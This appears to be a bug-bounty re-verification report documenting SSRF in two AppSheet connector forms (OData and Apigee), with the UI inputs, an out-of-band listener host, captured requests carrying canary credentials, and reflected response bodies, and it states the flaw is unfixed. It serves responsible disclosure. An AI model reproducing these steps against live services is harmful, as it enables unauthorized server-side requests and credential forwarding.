# AppSheet SSRF — Pre-Submission Re-Verification
**Date:** 2026-06-17  
**Purpose:** Independent re-confirmation before VRP F003 submission  
**OOB listener:** `d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro`

---

## Surface 1 — OData Data Connector ✅ CONFIRMED

**UI path:** `appsheet.com/Account/ODataAuthInfo`  
**Inputs used:**
- OData Version: 4.0
- OData Service Root URL: `https://d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro`
- Username: `Tester`
- Password: `Tester`
- Action: Click "Test"

**OOB capture (2026-06-17 12:52:14 UTC):**
```http
GET /$metadata HTTP/1.1
Host: d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro
Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8
Accept-Encoding: gzip, deflate
Authorization: Basic VGVzdGVyOlRlc3Rlcg==
Traceparent: 00-23103155bc2d083d8cf868a01076f20f-036bb2c7acf998da-00
```

**DNS interactions from (Google resolvers):** 192.178.118.89, 192.178.118.94, 192.178.118.84

**Verification checks:**
- Source IP: `34.82.138.241` (GCP — confirmed via gstatic.com/ipranges/cloud.json)
- Credential decode: `VGVzdGVyOlRlc3Rlcg==` → `Tester:Tester` ✓ (matches form input)
- HTTP client fingerprint: `Accept: application/xml; charset=utf-8, application/atom+xml; charset=utf-8` = Microsoft.OData.Client
- Response reflection: AppSheet UI error displayed `text/html; charset=utf-8` content-type from OOB server
- Traceparent: `00-23103155bc2d083d8cf868a01076f20f-036bb2c7acf998da-00` (internal GCP tracing)

---

## Surface 2 — Apigee API Connector (OpenAPI Spec URL) ✅ CONFIRMED

**UI path:** `appsheet.com/Account/ApigeeAuthInfo`  
**Inputs used (Test 1):**
- Authorization Type: ApiKey
- Apigee API Key: `Apigree12345678901234567890`
- OpenAPI Spec URL: `https://d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro`
- Action: Click "Validate"

**OOB capture (2026-06-17 12:53:59 UTC):**
```http
GET / HTTP/1.1
Host: d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-8bde2532872f8eb05b453ce8be84355b-7f88857fce367bc5-00
X-Apikey: Apigree12345678901234567890
```
- Source IP: `35.233.152.59` (GCP — same fleet node as original 2026-06-16 capture)

**Inputs used (Test 2 — fresh canary key):**
- Apigee API Key: `vrp-canary-apikey-2026`
- OpenAPI Spec URL: same OOB

**OOB captures (2026-06-17 12:56:02 UTC and 12:56:19 UTC):**
```http
GET / HTTP/1.1
Host: d8p98oq69r8c0ds3j7b0nds9dhhpnj6zk.oast.pro
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Traceparent: 00-47cefb617255800892017ee9a74f4798-67e8ed42535b61ab-00
X-Apikey: vrp-canary-apikey-2026
```
- Source IP: `8.231.222.130` (verify against GCP ranges — Traceparent confirms AppSheet backend)

**AppSheet UI error (both tests):**
```
Not connected. Invalid OpenAPI Spec: OpenAPI specification version 
'<html><head></head><body>kz6jnphhd9sdn0b7j3sd0c8r96qo89p8d</body></html>' is not supported.
```
→ Full HTML response body from OOB server reflected in AppSheet error ✓

**Verification checks:**
- `X-Apikey` forwarded verbatim (both canary values confirmed) ✓
- HTTP client distinct from OData: `Cache-Control: no-cache`, no OData Accept headers ✓
- Response body reflection in UI error ✓
- Traceparent confirmed AppSheet internal tracing ✓

---

## Systemic Confirmation

| Property | Surface 1 (OData) | Surface 2 (Apigee) |
|---|---|---|
| Date | 2026-06-17 12:52:14 UTC | 2026-06-17 12:53:59 UTC |
| GCP source IP | 34.82.138.241 | 35.233.152.59 |
| Credential forwarded | Authorization: Basic (Tester:Tester) | X-Apikey (verbatim) |
| HTTP path | GET /$metadata | GET / |
| HTTP client | Microsoft.OData.Client | Distinct (Cache-Control: no-cache) |
| Traceparent | 00-23103155bc2d083d8cf868a01076f20f-... | 00-8bde2532872f8eb05b453ce8be84355b-... |
| Response reflected | content-type in MIME error | full HTML body in OpenAPI error |

**Both surfaces confirmed independently open on 2026-06-17. Vulnerability not fixed.**
